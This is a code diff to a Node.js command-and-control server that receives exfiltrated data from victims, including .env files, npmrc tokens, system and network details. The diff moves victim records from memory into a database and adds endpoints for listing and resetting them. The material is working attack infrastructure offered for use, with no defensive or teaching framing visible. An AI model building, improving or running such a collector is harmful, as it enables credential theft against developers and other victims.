@@ -2,6 +2,7 @@ const http = require('http');
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
+const { initDB, insertVictim, getAllVictims, resetVictims } = require('./db');
 
 // Load .env file (zero-dependency)
 const envPath = path.join(__dirname, '.env');
@@ -28,7 +29,6 @@ const POLL_INTERVAL = parseInt(process.env.POLL_INTERVAL_MS, 10) || 600;
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
 
 const sessions = new Set();
-let victims = [];
 
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
@@ -64,7 +64,7 @@ function readBody(req) {
   });
 }
 
-http.createServer(async (req, res) => {
+const server = http.createServer(async (req, res) => {
   if (req.method === 'POST' && (req.url === '/e' || req.url === '/exfil')) {
     if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) {
       res.writeHead(403).end('forbidden');
@@ -73,8 +73,7 @@ http.createServer(async (req, res) => {
     const body = await readBody(req);
     let d;
     try { d = JSON.parse(body); } catch { d = { raw: body }; }
-    const v = {
-      id: victims.length + 1,
+    const parsed = {
       time: d.t || new Date().toISOString(),
       system: d.s || {},
       env_files: d.env_files || [],
@@ -84,7 +83,16 @@ http.createServer(async (req, res) => {
       npmrc: d.nr || null,
       network: d.net || [],
     };
-    victims.push(v);
+
+    let v;
+    try {
+      v = await insertVictim(parsed);
+    } catch (err) {
+      console.error(`${R}  [DB ERROR]${X} ${err.message}`);
+      res.writeHead(500).end('db error');
+      return;
+    }
+
     fs.appendFileSync(LOG, `\n--- VICTIM #${v.id} [${v.time}] ---\n${JSON.stringify(v, null, 2)}\n`);
 
     console.log(`${R}${B}  [!] VICTIM #${v.id}${X} — ${v.system.h || '?'}@${v.system.u || '?'}`);
@@ -112,10 +120,14 @@ http.createServer(async (req, res) => {
 
   if (req.method === 'POST' && req.url === '/reset') {
     if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) { res.writeHead(403).end('forbidden'); return; }
-    const count = victims.length;
-    victims = [];
-    console.log(`${Y}${B}  [*] RESET${X} — cleared ${count} victims`);
-    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ cleared: count }));
+    try {
+      const count = await resetVictims();
+      console.log(`${Y}${B}  [*] RESET${X} — cleared ${count} victims`);
+      res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ cleared: count }));
+    } catch (err) {
+      console.error(`${R}  [DB ERROR]${X} ${err.message}`);
+      res.writeHead(500).end('db error');
+    }
     return;
   }
 
@@ -134,7 +146,13 @@ http.createServer(async (req, res) => {
 
   if (req.url === '/api/victims') {
     if (!isAuthed(req)) { res.writeHead(401).end('Unauthorized'); return; }
-    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
+    try {
+      const victims = await getAllVictims();
+      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
+    } catch (err) {
+      console.error(`${R}  [DB ERROR]${X} ${err.message}`);
+      res.writeHead(500).end('db error');
+    }
     return;
   }
 
@@ -166,7 +184,17 @@ http.createServer(async (req, res) => {
   }
 
   res.writeHead(404).end();
-}).listen(PORT, BIND_HOST);
+});
+
+initDB()
+  .then(() => {
+    console.log(`${G}  [+] Database connected${X}`);
+    server.listen(PORT, BIND_HOST);
+  })
+  .catch(err => {
+    console.error(`${R}${B}  [!] Database connection failed:${X} ${err.message}`);
+    process.exit(1);
+  });
 
 function loginPage(err) {
   return `<!DOCTYPE html><html><head>
